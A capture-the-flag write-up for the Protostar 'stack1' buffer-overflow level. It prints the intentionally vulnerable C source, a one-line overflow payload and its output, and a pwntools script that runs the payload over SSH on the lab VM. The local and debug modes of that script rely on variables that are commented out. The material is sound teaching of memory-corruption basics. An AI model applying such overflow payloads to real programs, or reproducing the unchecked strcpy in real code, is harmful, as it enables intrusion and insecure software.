# Stack One

This level looks at the concept of modifying variables to specific values in the program, and how the variables are laid out in memory.

This level is at /opt/protostar/bin/stack1

Hints
- If you are unfamiliar with the hexadecimal being displayed, "man ascii" is your friend.
- Protostar is little endian

## Source Code

```c++
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```

## Writeup

In this code we have a **buffer** of 64 char, that means is a **buffer** of 64 byte.

After this, in the Stack we have the **modified** variable of 4 byte.

We can write 64 char and add at the end the 4 byte of **modified** value.

We need to write **0x61626364** in the **modified** variable. Let's inject it with python (in little endian):

```bash
/opt/protostar/bin/stack1 `python -c "print('A' * 64 + '\x64\x63\x62\x61')"`
```

The output of the program will be:

```bash
user@protostar:/opt/protostar/bin$ /opt/protostar/bin/stack1 `python -c "print('A' * 64 + '\x64\x63\x62\x61')"`
you have correctly got the variable to the right value
```

## Exploit

```python
#!/usr/bin/python3
from pwn import *

# Set up pwntools for the correct architecture
# exe = context.binary = ELF('stack1')

host = args.HOST or 'protostar'
port = int(args.PORT or 22)
user = args.USER or 'user'
password = args.PASSWORD or 'user'
remote_path = '/opt/protostar/bin/stack1'

# Connect to the remote SSH server
shell = None
if not args.LOCAL:
    shell = ssh(user, host, port, password)
    shell.set_working_directory(symlink=True)


def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def remote(argv=[], *a, **kw):
    '''Execute the target binary on the remote host'''
    shell.ELF
    if args.GDB:
        return gdb.debug([remote_path] + argv,
                         gdbscript=gdbscript,
                         ssh=shell,
                         *a,
                         **kw)
    else:
        return shell.run([remote_path] + argv, *a, **kw)


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
#gdbscript = '''
#break *0x{exe.symbols.main:x}
#continue
#'''.format(**locals())

payload = cyclic(64) + p32(0x61626364)

io = start([payload])

log.success(io.recvline())
```